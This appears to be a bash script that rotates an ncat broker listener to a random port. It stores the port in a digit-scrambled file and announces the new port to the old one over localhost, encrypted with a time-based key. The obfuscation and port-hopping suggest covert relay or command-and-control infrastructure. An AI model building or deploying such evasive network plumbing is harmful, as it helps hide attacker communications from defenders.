last=`cat masterport | tr '[7-90-6]' '[0-9]'`
find=`ps -eo pid,args | grep "ncat" | grep $last | sed -e 's/^[ \t]*//' | cut -d' ' -f1 2>/dev/null`
port=`shuf -i 1025-4000 -n1 | tr '[0-9]' '[7-90-6]' | tee masterport | tr '[7-90-6]' '[0-9]'`
echo "master>port $port" | openssl enc -aes-128-cbc -a -salt -pass pass:$(date +"%H%M")$last | tr "\n" "\`" | awk '{print $0}' | sed "s/U2FsdGVkX1//g" 2>/dev/null | nc -w 1 localhost $last 2>/dev/null
if ! kill -0 $find 2>/dev/null;then
	echo "No such port found: $last - $find"
fi
kill -9 $find 2>/dev/null
bash -c "ncat -km 100 -lp $port --broker &"
